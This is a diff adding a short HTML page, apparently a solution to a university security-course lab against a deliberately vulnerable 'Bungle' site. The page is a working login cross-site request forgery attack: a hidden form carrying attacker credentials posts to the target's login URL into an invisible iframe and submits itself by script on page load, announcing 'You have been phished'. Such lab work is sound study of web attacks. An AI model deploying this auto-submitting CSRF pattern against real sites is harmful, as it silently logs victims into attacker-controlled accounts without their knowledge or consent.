@@ -1,0 +1,12 @@
+<h2> Congratulations </h2>
+<h3> You have been phished :) </h3>
+<form target="attack_iframe" action="http://bungle-cs461.csl.illinois.edu/login?csrfdefense=0&xssdefense=5" method="post" name = "redirectform">
+    <input hidden name="username" value="attacker">
+    <input hidden name="password" value="l33th4x">
+</form>
+
+<iframe name="attack_iframe" style="display:none";></iframe>
+
+<script>
+    document.redirectform.submit();
+</script>
